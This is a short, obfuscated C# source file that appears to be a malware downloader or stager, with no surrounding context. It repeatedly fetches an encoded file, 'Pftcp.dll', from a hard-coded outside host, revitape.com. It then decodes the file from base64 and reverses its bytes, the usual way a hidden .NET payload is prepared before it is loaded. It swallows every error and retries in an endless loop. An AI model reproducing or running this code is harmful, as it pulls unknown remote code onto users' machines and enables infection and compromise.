using System;
using System.Linq;
using System.Net.Http;
using System.Text;

internal class qfgrz
{
	public static byte[] dymgs()
	{
		while (true)
		{
			try
			{
				byte[] bytes = dymgt("http://revitape.com/gdy/Pftcp.dll");
				return Convert.FromBase64String(Encoding.ASCII.GetString(bytes)).Reverse().ToArray();
			}
			catch
			{
			}
		}
	}

	private static byte[] dymgt(string bfjsj)
	{
		return new HttpClient().GetByteArrayAsync(bfjsj).Result;
	}
}
